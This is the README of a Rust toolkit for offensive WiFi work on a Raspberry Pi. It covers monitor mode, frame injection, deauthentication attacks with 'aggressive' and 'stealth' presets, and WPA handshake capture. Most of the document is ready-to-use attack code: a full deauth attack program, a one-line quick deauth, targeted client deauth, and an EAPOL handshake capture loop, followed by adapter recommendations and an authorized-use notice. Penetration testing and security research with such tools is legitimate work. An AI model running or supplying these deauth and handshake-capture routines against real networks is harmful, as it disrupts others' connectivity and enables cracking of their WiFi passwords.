# rustyjack-wireless 🦀📡

Native Rust wireless security toolkit for Raspberry Pi Zero W 2. Replaces aircrack-ng with pure Rust implementations for offensive WiFi operations.

## Why Native Rust?

- **Security**: No external binaries to compromise or tamper with
- **Performance**: Zero-copy packet handling, minimal overhead
- **Portability**: Single statically-linked binary
- **Auditability**: Full source code visibility, no hidden behavior
- **Integration**: Seamless integration with RustyJack ecosystem

## Features

### Monitor Mode Management
- Enable/disable monitor mode via nl80211 netlink interface
- Automatic process killing (NetworkManager, wpa_supplicant)
- Interface state preservation and restoration

### Packet Injection
- Raw 802.11 frame transmission
- Radiotap header handling
- Injection rate limiting and burst control

### Deauthentication Attacks
- Native deauth frame generation (no aireplay-ng)
- Configurable attack profiles (quick, aggressive, stealth)
- Bidirectional deauth (AP→client and client→AP)
- Client targeting or broadcast mode
- Real-time attack statistics

### Packet Capture
- Raw socket-based capture (no libpcap)
- BSSID/SSID filtering
- EAPOL frame detection
- Frame type classification

### WPA Handshake Detection
- 4-way handshake state machine
- EAPOL-Key frame parsing
- Complete handshake notification
- ANonce/SNonce extraction

### Channel Management
- 2.4GHz channels 1-14
- 5GHz channels 36-165
- Channel hopping for reconnaissance
- Frequency calculation

## Requirements

- **Platform**: Linux (required for raw sockets and nl80211)
- **Privileges**: Root (for raw socket access)
- **Hardware**: WiFi adapter with monitor mode + injection support

### Tested Chipsets

| Chipset | Monitor | Injection | Notes |
|---------|:-------:|:---------:|-------|
| AR9271 | ✅ | ✅ | Best compatibility |
| RTL8812AU | ✅ | ✅ | 5GHz support |
| RTL8187 | ✅ | ✅ | Legacy but works |
| RT3070 | ✅ | ✅ | Good range |
| MT7612U | ✅ | ✅ | Modern, fast |

### Recommended Adapters

| Adapter | Chipset | Price | Notes |
|---------|---------|-------|-------|
| Alfa AWUS036NHA | AR9271 | ~$30 | Best overall, 2.4GHz |
| Alfa AWUS036ACH | RTL8812AU | ~$50 | Dual-band, high power |
| TP-Link TL-WN722N **v1** | AR9271 | ~$15 | Budget (v1 ONLY!) |

⚠️ **Pi Zero W 2 Built-in WiFi does NOT support injection** - External adapter required.

## Usage Examples

### Basic Deauth Attack

```rust
use rustyjack_wireless::{
    WirelessInterface, DeauthAttacker, DeauthConfig, MacAddress
};
use std::time::Duration;

fn main() -> Result<(), Box<dyn std::error::Error>> {
    // Setup interface
    let mut iface = WirelessInterface::new("wlan1")?;
    iface.set_monitor_mode()?;
    iface.set_channel(6)?;

    // Target BSSID
    let target: MacAddress = "AA:BB:CC:DD:EE:FF".parse()?;

    // Configure attack
    let config = DeauthConfig {
        packets_per_burst: 64,
        duration: Duration::from_secs(120),
        burst_interval: Duration::from_secs(1),
        capture_handshake: true,
        ..Default::default()
    };

    // Execute attack
    let mut attacker = DeauthAttacker::new(&iface)?;
    let stats = attacker.attack(target, None, config)?;

    println!("Sent {} packets in {} bursts", stats.packets_sent, stats.bursts);
    println!("Handshake captured: {}", stats.handshake_captured);

    // Cleanup
    iface.set_managed_mode()?;
    Ok(())
}
```

### Targeted Client Deauth

```rust
// Target specific client instead of broadcast
let client: MacAddress = "11:22:33:44:55:66".parse()?;
let stats = attacker.attack(target_ap, Some(client), config)?;
```

### Quick Deauth (One-liner)

```rust
use rustyjack_wireless::deauth::quick_deauth;

// 30-second attack on channel 6
let stats = quick_deauth("wlan1", "AA:BB:CC:DD:EE:FF", 6, 30)?;
```

### Packet Capture with Handshake Detection

```rust
use rustyjack_wireless::{
    PacketCapture, CaptureFilter, HandshakeCapture, MacAddress
};

let mut capture = PacketCapture::new("wlan1mon")?;
capture.set_filter(CaptureFilter::for_bssid(target_bssid));

let mut handshake = HandshakeCapture::new(target_bssid, None);

while let Some(packet) = capture.next_packet()? {
    if packet.is_eapol() {
        handshake.process_packet(&packet);
        
        if handshake.is_complete() {
            println!("Full handshake captured!");
            break;
        }
    }
}
```

## Building

```bash
# Standard build (requires Linux)
cargo build --release

# Cross-compile for Raspberry Pi
cargo install cross
cross build --release --target aarch64-unknown-linux-gnu

# Build with all features
cargo build --release --all-features
```

## Module Architecture

```
rustyjack-wireless/
├── lib.rs           # Public API exports
├── error.rs         # WirelessError enum, Result type
├── frames.rs        # IEEE 802.11 frame structures
│   ├── FrameControl, MacAddress
│   ├── DeauthFrame, DisassocFrame
│   └── EapolFrame
├── radiotap.rs      # Radiotap header for injection
├── nl80211.rs       # Netlink 802.11 interface control
├── interface.rs     # WirelessInterface wrapper
│   ├── set_monitor_mode()
│   ├── set_channel()
│   └── set_managed_mode()
├── inject.rs        # PacketInjector for frame TX
├── capture.rs       # PacketCapture for frame RX
├── deauth.rs        # DeauthAttacker, DeauthConfig
├── handshake.rs     # HandshakeCapture, EAPOL parsing
└── channel.rs       # Channel/frequency utilities
```

## API Reference

### WirelessInterface

```rust
let mut iface = WirelessInterface::new("wlan1")?;
iface.set_monitor_mode()?;       // Enable monitor mode
iface.set_channel(6)?;           // Set channel
iface.is_monitor_mode()?;        // Check mode
iface.set_managed_mode()?;       // Restore normal mode
```

### DeauthAttacker

```rust
let mut attacker = DeauthAttacker::new(&iface)?;
let stats = attacker.attack(bssid, client, config)?;
let (stats, packets) = attacker.attack_with_capture(bssid, client, config)?;
```

### DeauthConfig Presets

```rust
DeauthConfig::default()     // 64 packets, 2min, 1s interval
DeauthConfig::quick()       // 30 seconds
DeauthConfig::aggressive()  // 128 packets, 500ms interval  
DeauthConfig::stealth()     // 8 packets, 5s interval
```

## Security & Legal Notice

⚠️ **AUTHORIZED USE ONLY**

This toolkit is designed for:
- Penetration testing with explicit written authorization
- Security research on your own networks
- Educational purposes in controlled environments

**Unauthorized use is illegal** and may violate:
- Computer Fraud and Abuse Act (US)
- Computer Misuse Act (UK)
- Similar laws in your jurisdiction

**Always obtain written permission** before testing any network you don't own.

## License

MIT License - See LICENSE file for details.
